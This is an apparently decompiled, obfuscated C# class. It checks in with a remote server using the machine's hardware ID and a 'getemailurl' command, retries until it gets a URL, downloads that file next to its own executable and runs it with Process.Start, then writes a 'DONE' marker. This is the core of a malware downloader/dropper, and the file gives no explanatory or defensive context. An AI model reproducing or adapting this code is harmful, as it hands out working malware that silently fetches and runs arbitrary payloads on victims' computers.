using System;
using System.Collections.Specialized;
using System.Diagnostics;
using System.IO;
using System.Reflection;
using System.Threading;

internal class Class0
{
	public void method_0()
	{
		NameValueCollection nameValueCollection = new NameValueCollection();
		nameValueCollection.Add("hwid", Class4.smethod_0());
		nameValueCollection.Add("func", "getemailurl");
		int num = 0;
		string text;
		while (true)
		{
			if (num < 10)
			{
				text = Class7.smethod_14(nameValueCollection);
				if (text != "down" && text != string.Empty)
				{
					break;
				}
				Thread.Sleep(10000);
				num++;
				continue;
			}
			return;
		}
		string text2 = method_1(text);
		if (text2 != string.Empty && method_2(text2))
		{
			try
			{
				File.WriteAllText(Class6.string_2, "DONE");
			}
			catch
			{
			}
		}
	}

	private string method_1(string string_0)
	{
		try
		{
			Uri uri = new Uri(string_0.Replace("http://", "file://").Replace("https://", "file://"));
			if (uri.IsFile)
			{
				string fileName = Path.GetFileName(uri.LocalPath);
				string text = Path.Combine(Path.GetDirectoryName(Assembly.GetEntryAssembly()!.Location), fileName);
				Class7.smethod_12(string_0, text, bool_0: false);
				return text;
			}
			return string.Empty;
		}
		catch (Exception)
		{
			return string.Empty;
		}
	}

	private bool method_2(string string_0)
	{
		try
		{
			string fileName = Environment.ExpandEnvironmentVariables(string_0);
			Process.Start(fileName);
			return true;
		}
		catch (Exception)
		{
			return false;
		}
	}
}
